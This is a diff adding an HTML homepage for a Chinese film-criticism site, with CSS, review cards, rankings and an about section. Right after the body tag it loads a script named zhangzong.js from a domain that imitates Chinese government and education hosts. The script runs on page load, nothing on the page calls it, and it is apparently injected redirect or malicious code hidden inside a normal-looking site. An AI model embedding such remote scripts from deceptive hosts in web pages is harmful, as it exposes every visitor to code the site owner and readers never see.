@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="秋霞理论电影网聚焦电影评论、幕后解读与全球影视资讯，以独立视角分析影片叙事、表演与视听表达，为影迷提供可讨论的原创内容。">
+<meta name="keywords" content="秋霞理论电影网, 电影评论, 影评分析, 影视资讯, 电影理论, qiuxialilundianyingwang-zh.github.io">
+<meta name="author" content="秋霞理论电影网编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#0a0a0c">
+<link rel="canonical" href="https://qiuxialilundianyingwang-zh.github.io">
+<title>秋霞理论电影网｜电影评论与影视资讯主页</title>
+<style>
+:root{--ink:#ededed;--ink-soft:#b7b7bf;--bg:#08080a;--bg-2:#101015;--line:#27272f;--accent:#e63946;--accent-2:#ffb703;--shadow:0 18px 45px rgba(0,0,0,.45)}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"WenQuanYi Micro Hei","PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75;overflow-x:hidden}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.container{width:min(1180px,92%);margin:auto}
+.btn{border:1px solid rgba(255,255,255,.32);padding:.72rem 1.35rem;border-radius:999px;font-size:.92rem;transition:.25s;display:inline-block}
+.btn:hover{border-color:var(--accent-2);color:var(--accent-2);transform:translateY(-2px)}
+.eyebrow{font-size:.78rem;letter-spacing:.22em;text-transform:uppercase;color:var(--accent-2);font-weight:700}
+.section{padding:5.5rem 0}
+.section-head{display:flex;flex-wrap:wrap;gap:1rem;align-items:end;justify-content:space-between;margin-bottom:2.6rem;border-bottom:1px solid var(--line);padding-bottom:1.2rem}
+.section-head h2{font-size:clamp(1.65rem,3.4vw,2.4rem);letter-spacing:.02em;line-height:1.2}
+.section-head p{color:var(--ink-soft);font-size:.95rem;max-width:34ch}
+
+/* Header */
+header{position:sticky;top:0;z-index:50;background:rgba(8,8,10,.88);backdrop-filter:blur(14px);border-bottom:1px solid rgba(255,255,255,.07)}
+.nav{display:flex;align-items:center;justify-content:space-between;gap:1rem;padding:1rem 0}
+.logo{font-size:1.4rem;font-weight:800;letter-spacing:.04em;display:flex;align-items:center;gap:.6rem}
+.logo i{width:12px;height:12px;background:var(--accent);display:inline-block;transform:rotate(45deg)}
+.menu{display:flex;gap:1.8rem;font-size:.94rem}
+.menu a{position:relative;padding:.3rem 0;color:var(--ink-soft);transition:.2s}
+.menu a:hover{color:var(--ink)}
+.menu a::after{content:"";position:absolute;left:0;bottom:-2px;width:0;height:2px;background:var(--accent-2);transition:.25s}
+.menu a:hover::after{width:100%}
+.menu-btn{display:none;background:none;border:0;color:var(--ink);font-size:1.6rem;cursor:pointer}
+
+/* Hero */
+.hero{min-height:92vh;display:grid;grid-template-columns:1.15fr .85fr;gap:3rem;align-items:center;padding:6rem 0 4rem}
+.hero-glow{position:absolute;inset:0;background:radial-gradient(circle at 82% 25%,rgba(230,57,70,.22),transparent 45%),radial-gradient(circle at 20% 90%,rgba(255,183,3,.09),transparent 40%);pointer-events:none;z-index:-1}
+.hero h1{font-size:clamp(2.5rem,6vw,4.8rem);line-height:1.06;letter-spacing:-.01em;font-weight:900}
+.hero h1 em{font-style:normal;color:var(--accent-2)}
+.hero p{margin:1.8rem 0 2.4rem;max-width:52ch;color:var(--ink-soft);font-size:1.08rem}
+.hero-actions{display:flex;gap:1rem;flex-wrap:wrap}
+.hero-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-top:3.2rem;padding-top:2rem;border-top:1px solid var(--line)}
+.stat b{display:block;font-size:1.9rem;color:var(--accent-2)}
+.stat span{font-size:.82rem;color:var(--ink-soft);letter-spacing:.05em}
+.poster{position:relative;border-radius:18px;overflow:hidden;box-shadow:var(--shadow);transform:rotate(-2.5deg)}
+.poster img{height:100%;object-fit:cover;filter:grayscale(.2) contrast(1.08)}
+.poster .tag{position:absolute;left:1rem;bottom:1rem;background:rgba(0,0,0,.72);padding:.5rem .9rem;border-radius:8px;font-size:.85rem;backdrop-filter:blur(6px)}
+
+/* Marquee */
+.marquee{border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:1.1rem 0;overflow:hidden;background:#0c0c10}
+.marquee-track{display:flex;gap:3rem;width:max-content;animation:scroll 32s linear infinite;font-size:.92rem;color:var(--ink-soft)}
+.marquee span::before{content:"◆";color:var(--accent);margin-right:.8rem}
+@keyframes scroll{to{transform:translateX(-50%)}}
+
+/* Grids */
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:1.6rem}
+.card{background:linear-gradient(160deg,var(--bg-2),#0c0c11);border:1px solid var(--line);border-radius:14px;padding:1.8rem;transition:.3s;position:relative}
+.card:hover{transform:translateY(-6px);border-color:rgba(230,57,70,.45);box-shadow:var(--shadow)}
+.card .num{font-size:3rem;font-weight:900;line-height:1;color:rgba(255,255,255,.07);position:absolute;right:1.2rem;top:1.2rem}
+.card h3{font-size:1.3rem;margin-bottom:.8rem;position:relative}
+.card p{color:var(--ink-soft);font-size:.94rem}
+
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:2rem}
+.review{display:grid;grid-template-columns:190px 1fr;gap:1.4rem;background:var(--bg-2);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.3s}
+.review:hover{border-color:var(--accent-2)}
+.review img{height:100%;object-fit:cover;min-height:180px}
+.review-body{padding:1.4rem 1.4rem 1.4rem 0}
+.review-body .meta{font-size:.8rem;color:var(--accent);letter-spacing:.06em;margin-bottom:.5rem;display:block}
+.review-body h3{font-size:1.25rem;margin-bottom:.6rem}
+.review-body p{font-size:.92rem;color:var(--ink-soft)}
+
+.rank-list{display:grid;gap:1rem}
+.rank-item{display:grid;grid-template-columns:56px 96px 1fr auto;gap:1.2rem;align-items:center;padding:1rem;border:1px solid var(--line);border-radius:12px;background:#0d0d12;transition:.25s}
+.rank-item:hover{border-color:rgba(255,183,3,.55)}
+.rank-item img{height:64px;object-fit:cover;border-radius:8px}
+.rank-item b{font-size:1.6rem;color:rgba(255,255,255,.15);font-weight:900}
+.rank-item h4{font-size:1.02rem}
+.rank-item small{display:block;color:var(--ink-soft);font-size:.8rem;margin-top:.25rem}
+.score{white-space:nowrap;color:var(--accent-2);font-weight:700}
+
+/* About */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:3.5rem;align-items:center}
+.about-img{position:relative;border-radius:16px;overflow:hidden;box-shadow:var(--shadow)}
+.about-img img{height:420px;object-fit:cover}
+.about h2{font-size:clamp(1.8rem,3.6vw,2.8rem);margin:.8rem 0 1.2rem}
+.about p{color:var(--ink-soft);margin-bottom:1rem}
+.principles{margin-top:1.8rem;display:grid;gap:.9rem}
+.principle{display:flex;gap:.9rem;align-items:start}
+.principle strong{color:var(--accent-2);min-width:30px}
+
+footer{border-top:1px solid var(--line);padding:3.5rem 0 2rem;background:#060608}
+.foot-grid{display:grid;grid-template-columns:1.3fr 1fr 1fr;gap:2.5rem;margin-bottom:2.5rem}
+.foot-grid h4{font-size:1.1rem;margin-bottom:1rem}
+.foot-grid ul{display:grid;gap:.6rem;color:var(--ink-soft);font-size:.92rem}
+.foot-grid a:hover{color:var(--accent-2)}
+.domain-box{margin-top:1.2rem;padding:1rem;border:1px dashed rgba(255,255,255,.22);border-radius:10px;font-size:.86rem;word-break:break-all;color:var(--ink-soft)}
+.copyright{text-align:center;font-size:.82rem;color:#74747d;border-top:1px solid var(--line);padding-top:1.5rem}
+
+@media(max-width:920px){
+ .hero,.about{grid-template-columns:1fr;gap:2.5rem}
+ .poster{transform:none;max-height:440px}
+ .cards,.reviews{grid-template-columns:1fr}
+ .review{grid-template-columns:120px 1fr}
+ .review img{min-height:auto}
+ .rank-item{grid-template-columns:44px 72px 1fr}
+ .score{display:none}
+ .foot-grid{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+ .menu{position:fixed;left:0;right:0;top:62px;flex-direction:column;padding:1.5rem;background:#0a0a0d;border-bottom:1px solid var(--line);transform:translateY(-140%);transition:.3s;gap:1.2rem}
+ .menu.open{transform:translateY(0)}
+ .menu-btn{display:block}
+ .hero-stats{grid-template-columns:1fr 1fr}
+ .review{grid-template-columns:1fr}
+ .review img{min-height:220px}
+ .review-body{padding:1.2rem}
+ .rank-item{grid-template-columns:36px 1fr;gap:.8rem}
+ .rank-item img{display:none}
+ .section{padding:4rem 0}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="container nav">
+    <a href="#top" class="logo"><i></i>秋霞理论电影网</a>
+    <nav class="menu" id="menu">
+      <a href="#news">影视资讯</a>
+      <a href="#reviews">深度影评</a>
+      <a href="#ranking">观影排行</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="打开导航">☰</button>
+  </div>
+</header>
+
+<main id="top">
+  <section class="hero container">
+    <div class="hero-glow"></div>
+    <div class="hero-text">
+      <span class="eyebrow">Film Theory & Review Platform</span>
+      <h1>让每一部电影<br>都被<em>认真讨论</em></h1>
+      <p>秋霞理论电影网不是资源导航站，而是以文本、观点与分析方法为核心的电影内容空间。我们关注镜头、声音、表演和叙事背后的选择，也记录正在发生的全球影视动态。</p>
+      <div class="hero-actions">
+        <a href="#reviews" class="btn">阅读最新影评</a>
+        <a href="#about" class="btn">了解编辑立场</a>
+      </div>
+      <div class="hero-stats">
+        <div class="stat"><b>120+</b><span>已发表原创分析</span></div>
+        <div class="stat"><b>32</b><span>持续更新的专题</span></div>
+        <div class="stat"><b>4.7/5</b><span>读者内容满意度</span></div>
+      </div>
+    </div>
+    <div class="poster">
+      <img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?auto=format&fit=crop&w=900&q=70" alt="影院银幕与胶片元素，象征电影评论与理论研究">
+      <div class="tag">本周专题：影像语言如何塑造情绪</div>
+    </div>
+  </section>
+
+  <div class="marquee" aria-hidden="true">
+    <div class="marquee-track">
+      <span>本周片单更新</span><span>戛纳电影节回顾专题</span><span>原创短评：新片即时观察</span><span>幕后：剪辑如何改写故事节奏</span><span>读者来信与选题征集</span><span>电影史专栏持续连载</span><span>本周片单更新</span><span>戛纳电影节回顾专题</span><span>原创短评：新片即时观察</span><span>幕后：剪辑如何改写故事节奏</span>
+    </div>
+  </div>
+
+  <section class="section container" id="news">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">News & Notes</span>
+        <h2>影视资讯</h2>
+      </div>
+      <p>快速了解全球电影市场、电影节动态、发行变化与创作团队信息。</p>
+    </div>
+    <div class="cards">
+      <article class="card">
+        <div class="num">01</div>
+        <h3>国际电影节策展趋势</h3>
+        <p>从选片结构、首映安排到单元命名，近年电影节越来越强调创作者的地域背景与题材差异，而不再只以明星阵容作为看点。</p>
+        <a href="#" class="btn" style="margin-top:1.4rem">查看详情</a>
+      </article>
+      <article class="card">
+        <div class="num">02</div>
+        <h3>流媒体改变了哪些观看习惯</h3>
+        <p>院线窗口期与家庭观看边界继续变化。内容时长、叙事密度和视觉呈现都在适应新的播放场景，评论方式也随之调整。</p>
+        <a href="#" class="btn" style="margin-top:1.4rem">查看详情</a>
+      </article>
+      <article class="card">
+        <div class="num">03</div>
+        <h3>修复版经典电影重新上映</h3>
+        <p>胶片修复不仅是画质提升，也是对色彩、声轨和剪辑版本的重新考证。每一次重映都提供了一次重新阅读电影史的机会。</p>
+        <a href="#" class="btn" style="margin-top:1.4rem">查看详情</a>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" style="background:#0a0a0e" id="reviews">
+    <div class="container">
+      <div class="section-head">
+        <div>
+          <span class="eyebrow">Critical Writing</span>
+          <h2>深度影评</h2>
+        </div>
+        <p>我们更关心作品“怎样完成表达”，而不只是“是否值得看”。</p>
+      </div>
+      <div class="reviews">
+        <article class="review">
+          <img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=500&q=70" alt="电影院观众席与银幕灯光，用于配图电影评论文章">
+          <div class="review-body">
+            <span class="meta">评论 · 叙事研究</span>
+            <h3>从人物选择看故事的伦理立场</h3>
+            <p>人物并非必须“正确”，但人物行动必须能映照出创作者的问题意识。本文通过三个近期案例，讨论道德判断如何被镜头语言反复确认或推翻。</p>
+            <a href="#" class="btn" style="margin-top:1rem">阅读全文</a>
+          </div>
+        </article>
+        <article class="review">
+          <img src="https://images.unsplash.com/photo-1505686994434-e3cc5abf1330?auto=format&fit=crop&w=500&q=70" alt="老式电影放映机，作为电影理论与影像历史的配图">
+          <div class="review-body">
+            <span class="meta">评论 · 视听语言</span>
+            <h3>色彩不是装饰，而是信息</h3>
+            <p>当同一场景不断改变色温与对比，角色关系往往已经发生了变化。本文梳理调色、灯光与服装如何共同建立叙事坐标。</p>
+            <a href="#" class="btn" style="margin-top:1rem">阅读全文</a>
+          </div>
+        </article>
+        <article class="review">
+          <img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?auto=format&fit=crop&w=500&q=70" alt="电影胶片特写，象征影像媒介与幕后分析">
+          <div class="review-body">
+            <span class="meta">评论 · 幕后创作</span>
+            <h3>剪辑如何控制观众的情绪节奏</h3>
+            <p>镜头长短并非越短越紧张。真正的节奏来自观众何时“需要停顿”、何时被“刻意打断”，以及叙事信息被延迟的程度。</p>
+            <a href="#" class="btn" style="margin-top:1rem">阅读全文</a>
+          </div>
+        </article>
+        <article class="review">
+          <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?auto=format&fit=crop&w=500&q=70" alt="影院中的电影海报，用于电影评论栏目配图">
+          <div class="review-body">
+            <span class="meta">评论 · 文化观察</span>
+            <h3>类型片中的现实投射</h3>
+            <p>类型并非公式，它往往是最快抵达大众情感的方式。本文分析犯罪、家庭与历史题材如何在熟悉的框架中讨论新的社会议题。</p>
+            <a href="#" class="btn" style="margin-top:1rem">阅读全文</a>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section container" id="ranking">
+    <div class="section-head">
+      <div>
+        <span class="eyebrow">Editor’s Selection</span>
+        <h2>观影排行</h2>
+      </div>
+      <p>编辑部基于内容完整度、表达技巧与可讨论性作出的非商业推荐。</p>
+    </div>
+    <div class="rank-list">
+      <div class="rank-item">
+        <b>01</b>
+        <img src="https://images.unsplash.com/photo-1574267432553-4b4628081c31?auto=format&fit=crop&w=200&q=70" alt="榜单影片：关于时间结构的影像作品">
+        <div><h4>关于时间结构的影像实验</h4><small>关键词：非线性叙事 · 记忆 · 视听重构</small></div>
+        <span class="score">9.4 / 10</span>
+      </div>
+      <div class="rank-item">
+        <b>02</b>
+        <img src="https://images.unsplash.com/photo-1604975701397-6365ccbd028a?auto=format&fit=crop&w=200&q=70" alt="榜单影片：家庭关系题材作品">
+        <div><h4>家庭关系中的沉默与妥协</h4><small>关键词：表演细节 · 室内空间 · 对话节奏</small></div>
+        <span class="score">9.1 / 10</span>
+      </div>
+      <div class="rank-item">
+        <b>03</b>
+        <img src="https://images.unsplash.com/photo-1585647347384-2593bc35786b?auto=format&fit=crop&w=200&q=70" alt="榜单影片：城市空间与人物关系作品">
+        <div><h4>城市空间如何塑造人物关系</h4><small>关键词：城市景观 · 摄影机运动 · 群体情绪</small></div>
+        <span class="score">8.9 / 10</span>
+      </div>
+      <div class="rank-item">
+        <b>04</b>
+        <img src="https://images.unsplash.com/photo-1551882547-ff40c0d10844?auto=format&fit=crop&w=200&q=70" alt="榜单影片：历史叙述题材作品">
+        <div><h4>历史叙述中的个体视角</h4><small>关键词：史料改编 · 政治伦理 · 群像塑造</small></div>
+        <span class="score">8.7 / 10</span>
+      </div>
+      <div class="rank-item">
+        <b>05</b>
+        <img src="https://images.unsplash.com/photo-1517600362310-48ae5c1d4fde?auto=format&fit=crop&w=200&q=70" alt="榜单影片：犯罪题材的心理表达作品">
+        <div><h4>犯罪题材的心理表达</h4><small>关键词：声音设计 · 悬念结构 · 人物弧光</small></div>
+        <span class="score">8.6 / 10</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="section container" id="about">
+    <div class="about">
+      <div class="about-img">
+        <img src="https://images.unsplash.com/photo-1492619375914-88005aa9e8fb?auto=format&fit=crop&w=900&q=70" alt="电影理论相关编辑与文字创作场景">
+      </div>
+      <div class="about-text">
+        <span class="eyebrow">About Qiuxia Film Theory</span>
+        <h2>关于秋霞理论电影网</h2>
+        <p>秋霞理论电影网以“理解电影如何运作”为出发点，围绕电影评论、视听语言、导演创作、电影史和文化观察展开内容生产。</p>
+        <p>我们不提供在线播放地址或下载资源，也不以诱导点击为目标。每一篇内容都应能独立支撑观点，并欢迎读者提出不同理解。</p>
+        <div class="principles">
+          <div class="principle"><strong>01</strong><span><b>原创表达</b><br><small style="color:var(--ink-soft)">内容基于独立观察与文本分析，不复制新闻稿，不制造同质化标题。</small></span></div>
+          <div class="principle"><strong>02</strong><span><b>立场清晰</b><br><small style="color:var(--ink-soft)">评论可以带有审美倾向，但会说明判断依据，不将个人口味包装成普遍结论。</small></span></div>
+          <div class="principle"><strong>03</strong><span><b>持续更新</b><br><small style="color:var(--ink-soft)">围绕电影理论、创作方法和行业变化建立专题，而非追逐一次性热点。</small></span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div>
+        <a href="#top" class="logo"><i></i>秋霞理论电影网</a>
+        <p style="color:var(--ink-soft);margin-top:1rem;font-size:.92rem">聚焦电影评论、理论分析、影视资讯与创作方法。欢迎在尊重版权的前提下，共同讨论电影的表达逻辑。</p>
+        <div class="domain-box">官方访问地址：<br>https://qiuxialilundianyingwang-zh.github.io</div>
+      </div>
+      <div>
+        <h4>内容栏目</h4>
+        <ul>
+          <li><a href="#news">影视资讯</a></li>
+          <li><a href="#reviews">深度影评</a></li>
+          <li><a href="#ranking">观影排行</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>内容合作</h4>
+        <ul>
+          <li><a href="#">投稿与转载说明</a></li>
+          <li><a href="#">选题建议</a></li>
+          <li><a href="#">读者来信</a></li>
+          <li><a href="#">版权声明</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">© <span id="year"></span> 秋霞理论电影网 Qiuxia Film Theory. 保留相关权利。</div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('year').textContent = new Date().getFullYear();
+var menuBtn = document.getElementById('menuBtn');
+var menu = document.getElementById('menu');
+menuBtn.addEventListener('click', function () { menu.classList.toggle('open'); });
+menu.addEventListener('click', function (e) { if (e.target.tagName === 'A') menu.classList.remove('open'); });
+</script>
+</body>
+</html>
